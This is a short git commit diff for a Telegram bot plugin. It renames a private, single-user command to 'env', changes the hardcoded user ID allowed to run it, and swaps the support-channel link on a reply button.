a3b1e9f900d39aa889a4a8637d2e0cf2d26d59d3
Axiom Coder <prettylioness0550@gmail.com>
2026-07-21 20:36:26 +0530

    Update reload.py

--- ScarletV5/plugins/tools/reload.py
+++ ScarletV5/plugins/tools/reload.py
@@ -106,9 +106,9 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("pela_peli")
+    filters.command("env")
     & filters.private
-    & filters.user(6009873389)
+    & filters.user(8903246123)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
@@ -118,7 +118,7 @@ async def help(client: Client, message: Message):
              [
                  [
                       InlineKeyboardButton(
-                         "• ᴜᴘᴅᴀᴛᴇ •", url=f"https://t.me/AxiomBots")
+                         "• ᴜᴘᴅᴀᴛᴇ •", url=f"https://t.me/ScarletSupportChat")
                  ]
             ]
          ),
